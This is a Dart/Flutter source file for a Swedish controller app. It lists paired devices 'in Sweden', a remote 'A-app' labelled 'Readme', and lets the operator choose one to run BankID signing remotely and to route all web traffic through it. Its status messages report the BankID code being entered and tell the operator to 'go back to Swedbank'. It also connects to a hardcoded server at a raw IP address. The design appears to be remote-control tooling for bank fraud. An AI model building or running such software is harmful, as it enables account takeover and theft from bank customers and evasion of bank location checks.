import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';


/// B-app (Controller) på Note 10.
///
/// Visar parade A-app-enheter (Readme), låter användaren välja vilken som ska
/// hantera BankID och genom vilken all webbtrafik ska gå. Sparar inga PIN-koder.
void main() => runApp(const ControllerApp());

class ControllerApp extends StatelessWidget {
  const ControllerApp({super.key});

  @override
  Widget build(BuildContext context) => MaterialApp(
        title: 'Pult – Kontroll',
        theme: ThemeData.dark(useMaterial3: true),
        home: const HomePage(),
      );
}

enum SignStage { idle, sent, opened, signing, signed, failed }

class Device {
  Device({
    required this.deviceId,
    required this.pairId,
    this.label,
    this.model,
    this.os,
    this.ip,
    this.online = false,
  });

  final String deviceId;
  final String pairId;
  final String? label;
  final String? model;
  final String? os;
  final String? ip;
  final bool online;

  String get displayName => label?.isNotEmpty == true
      ? label!
      : (model?.isNotEmpty == true ? model! : 'A-app');

  String get subtitle {
    final parts = <String>[
      if (model?.isNotEmpty == true) 'Modell: $model',
      if (os?.isNotEmpty == true) 'OS: $os',
      if (ip?.isNotEmpty == true) 'IP: $ip',
      online ? 'Ansluten' : 'Inte ansluten',
    ];
    return parts.join(' · ');
  }
}

class LinkBridge {
  LinkBridge({required this.onChanged});

  static const defaultServer = 'wss://85.190.98.57.sslip.io:8445';
  static const defaultPairId = 'demo-pair-000000000000';
  static const _ch = MethodChannel('pult.gateway/link');
  static const _control = MethodChannel('pult.gateway/control');

  String server = defaultServer;
  String pairId = defaultPairId;
  String token = '';

  bool online = false;
  SignStage stage = SignStage.idle;
  String lastError = '';
  bool tunnelOnline = false;
  int tunnelStreams = 0;

  List<Device> devices = [];

  final VoidCallback onChanged;

  Future<void> start() async {
    _ch.setMethodCallHandler((call) async {
      if (call.method == 'changed') await refresh();
    });
    await refresh();
    await loadDevices();
  }

  Future<void> connect() async {
    try {
      await _ch.invokeMethod<void>('reloadLink');
      await refresh();
    } catch (_) {}
  }

  Future<void> refresh() async {
    try {
      final state = await _ch.invokeMethod<Map<dynamic, dynamic>>('getState');
      online = state?['online'] == true;
      tunnelOnline = state?['tunnelOnline'] == true;
      tunnelStreams = (state?['tunnelStreams'] as int?) ?? 0;
      final raw = (state?['lastStatus'] as String?) ?? '';
      if (raw.isNotEmpty) {
        final msg = jsonDecode(raw) as Map<String, dynamic>;
        final s = msg['stage'] as String? ?? '';
        stage = switch (s) {
          'sent' => SignStage.sent,
          'opened' => SignStage.opened,
          'signing' => SignStage.signing,
          'signed' => SignStage.signed,
          _ => SignStage.failed,
        };
        lastError = msg['ok'] == true ? '' : (msg['err'] as String? ?? 'fel');
      }
    } catch (_) {}
    onChanged();
  }

  Future<void> clearStatus() async {
    try {
      await _ch.invokeMethod<void>('clearStatus');
    } catch (_) {}
    stage = SignStage.idle;
    lastError = '';
    onChanged();
  }

  Future<void> loadDevices() async {
    try {
      final raw = await _control.invokeMethod<String>('getDevices');
      final list = jsonDecode(raw ?? '[]') as List<dynamic>;
      devices = list.map((it) {
        final m = it as Map<String, dynamic>;
        return Device(
          deviceId: m['deviceId'] as String? ?? '',
          pairId: m['pairId'] as String? ?? '',
          label: m['label'] as String?,
          model: m['model'] as String?,
          os: m['os'] as String?,
          ip: m['ip'] as String?,
          online: m['online'] == true,
        );
      }).toList();
    } catch (e) {
      devices = [];
    }
    onChanged();
  }

  Future<bool> sendScreencast(bool on) async {
    try {
      await _ch.invokeMethod<void>('sendScreencast', on);
      return true;
    } catch (_) {
      return false;
    }
  }

  Future<void> dispose() async {}
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  late final LinkBridge client;
  String _ipTestResult = '';
  bool _proxyOn = false;
  bool _proxyWanted = false;
  static const _control = MethodChannel('pult.gateway/control');
  static const _tunnelPort = 8877;
  String? _selectedDeviceId;

  @override
  void initState() {
    super.initState();
    client = LinkBridge(onChanged: () {
      if (!client.tunnelOnline && _proxyOn) _dropProxy();
      if (client.tunnelOnline && _proxyWanted && !_proxyOn) _toggleProxy(true);
      if (mounted) setState(() {});
    });
    _loadSettings().then((_) {
      client.start();
      client.connect();
      _proxyWanted = true;
      _refreshProxyState().then((_) {
        if (_proxyOn && !client.tunnelOnline) _dropProxy();
      });
    });
  }

  Future<void> _loadSettings() async {
    final prefs = await SharedPreferences.getInstance();
    client.server = prefs.getString('server') ?? LinkBridge.defaultServer;
    client.pairId = prefs.getString('pairId') ?? LinkBridge.defaultPairId;
    client.token = prefs.getString('token') ?? '';
    _selectedDeviceId = prefs.getString('selectedDeviceId');
  }

  Future<void> _saveSettings() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('server', client.server);
    await prefs.setString('pairId', client.pairId);
    await prefs.setString('token', client.token);
    if (_selectedDeviceId != null) {
      await prefs.setString('selectedDeviceId', _selectedDeviceId!);
    } else {
      await prefs.remove('selectedDeviceId');
    }
  }

  Future<void> _selectDevice(Device device) async {
    setState(() => _selectedDeviceId = device.deviceId);
    await _saveSettings();
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('flutter.selectedDeviceId', device.deviceId);
    if (client.tunnelOnline && !_proxyOn) _toggleProxy(true);
  }

  Future<void> _refreshProxyState() async {
    try {
      final value = await _control.invokeMethod<String>('getProxy');
      if (mounted) setState(() => _proxyOn = value != null && value.contains('8877'));
    } catch (_) {}
  }

  Future<void> _toggleProxy(bool on) async {
    try {
      await _control.invokeMethod<bool>('setProxy', {'on': on, 'port': _tunnelPort});
      _proxyWanted = on;
      setState(() => _proxyOn = on);
    } catch (e) {
      setState(() => _ipTestResult = 'Kunde inte ändra proxyn: $e');
    }
  }

  Future<void> _dropProxy() async {
    try {
      await _control.invokeMethod<bool>('setProxy', {'on': false, 'port': _tunnelPort});
    } catch (_) {}
    if (mounted) setState(() => _proxyOn = false);
  }

  Future<void> _testPublicIp() async {
    setState(() {
      _ipTestResult = 'Kontrollerar…';
    });
    try {
      final request = await HttpClient()
          .getUrl(Uri.parse('https://api.ipify.org?format=json'))
          .timeout(const Duration(seconds: 10));
      final response = await request.close();
      final body = await response.transform(utf8.decoder).join();
      final ip = (jsonDecode(body) as Map<String, dynamic>)['ip'] as String? ?? '?';
      setState(() => _ipTestResult = 'Publik IP: $ip');
    } catch (e) {
      setState(() => _ipTestResult = 'Det gick inte att kontrollera IP: $e');
    }
  }

  void _openSettings() {
    final server = TextEditingController(text: client.server);
    final pairId = TextEditingController(text: client.pairId);
    final token = TextEditingController(text: client.token);
    showDialog<void>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('Kanal'),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(controller: server, decoration: const InputDecoration(labelText: 'Server')),
            TextField(controller: pairId, decoration: const InputDecoration(labelText: 'Pair-ID')),
            TextField(
              controller: token,
              decoration: const InputDecoration(labelText: 'Kanaltoken'),
              obscureText: true,
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              client.server = server.text.trim();
              client.pairId = pairId.text.trim();
              client.token = token.text.trim();
              _saveSettings();
              client.connect();
              Navigator.of(ctx).pop();
            },
            child: const Text('Spara'),
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    client.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final (label, color) = switch (client.stage) {
      SignStage.idle => ('', Colors.grey),
      SignStage.sent => ('Skickat till enheten…', Colors.orange),
      SignStage.opened => ('BankID är öppet, koden anges…', Colors.orange),
      SignStage.signing => ('Signering pågår…', Colors.orange),
      SignStage.signed => ('Klart – gå tillbaka till Swedbank', Colors.green),
      SignStage.failed => ('Fel: ${client.lastError}', Colors.red),
    };
    final selected = client.devices.firstWhere(
      (d) => d.deviceId == _selectedDeviceId,
      orElse: () => Device(deviceId: '', pairId: ''),
    );
    return Scaffold(
      appBar: AppBar(
        title: const Text('Pult – Kontroll'),
        actions: [
          IconButton(icon: const Icon(Icons.refresh), onPressed: () => client.loadDevices()),
          IconButton(icon: const Icon(Icons.settings), onPressed: _openSettings),
        ],
      ),
      body: RefreshIndicator(
        onRefresh: client.loadDevices,
        child: ListView(
          padding: const EdgeInsets.all(16),
          children: [
            _statusCard(),
            const SizedBox(height: 16),
            if (label.isNotEmpty) _signStatusCard(label, color),
            const SizedBox(height: 16),
            Text('Enheter i Sverige', style: Theme.of(context).textTheme.titleMedium),
            const SizedBox(height: 8),
            if (client.devices.isEmpty)
              const Card(
                child: Padding(
                  padding: EdgeInsets.all(16),
                  child: Text('Inga anslutna enheter. Kontrollera kanalen och uppdatera listan.'),
                ),
              )
            else
              ...client.devices.map((d) => _deviceTile(d)),
            const SizedBox(height: 16),
            if (selected.deviceId.isNotEmpty) _selectedDeviceCard(selected),
            const SizedBox(height: 16),
            if (_ipTestResult.isNotEmpty)
              Padding(
                padding: const EdgeInsets.all(12),
                child: Text(_ipTestResult, textAlign: TextAlign.center),
              ),
          ],
        ),
      ),
    );
  }

  Widget _statusCard() => Card(
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: Row(
            children: [
              Icon(
                client.online ? Icons.link : Icons.link_off,
                size: 40,
                color: client.online ? Colors.green : Colors.red,
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      client.online ? 'Kanal till servern: ansluten' : 'Kanalen är inte ansluten',
                      style: const TextStyle(fontSize: 16),
                    ),
                    Text(
                      client.tunnelOnline
                          ? 'Tunneln är aktiv (${client.tunnelStreams} strömmar)'
                          : 'Tunneln är inte uppe',
                      style: TextStyle(fontSize: 13, color: Colors.grey.shade400),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      );

  Widget _signStatusCard(String label, Color color) => Card(
        color: color.withOpacity(0.15),
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: Row(
            children: [
              Expanded(child: Text(label, style: TextStyle(fontSize: 16, color: color))),
              if (client.stage == SignStage.signed || client.stage == SignStage.failed)
                TextButton(
                  onPressed: client.clearStatus,
                  child: const Text('Återställ'),
                ),
            ],
          ),
        ),
      );

  Widget _deviceTile(Device device) => Card(
        margin: const EdgeInsets.only(bottom: 8),
        child: ListTile(
          leading: Icon(
            device.online ? Icons.phone_android : Icons.phone_android_outlined,
            color: device.online ? Colors.green : Colors.grey,
          ),
          title: Text(device.displayName),
          subtitle: Text(device.subtitle),
          trailing: _selectedDeviceId == device.deviceId
              ? const Icon(Icons.check_circle, color: Colors.green)
              : TextButton(
                  onPressed: () => _selectDevice(device),
                  child: const Text('Välj'),
                ),
        ),
      );

  Widget _selectedDeviceCard(Device device) => Card(
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text('Aktiv enhet', style: TextStyle(fontSize: 13, color: Colors.grey.shade400)),
              const SizedBox(height: 4),
              Text(device.displayName, style: const TextStyle(fontSize: 18)),
              Text(device.subtitle, style: TextStyle(fontSize: 13, color: Colors.grey.shade400)),
              const SizedBox(height: 12),
              Row(
                children: [
                  Expanded(
                    child: ElevatedButton.icon(
                      onPressed: () => _toggleProxy(!_proxyOn),
                      icon: Icon(_proxyOn ? Icons.stop : Icons.vpn_key),
                      label: Text(_proxyOn
                          ? 'All trafik går via ${device.displayName}'
                          : 'Skicka all trafik via ${device.displayName}'),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 8),
              SizedBox(
                width: double.infinity,
                child: TextButton(
                  onPressed: _testPublicIp,
                  child: const Text('Kontrollera publik IP'),
                ),
              ),
            ],
          ),
        ),
      );
}
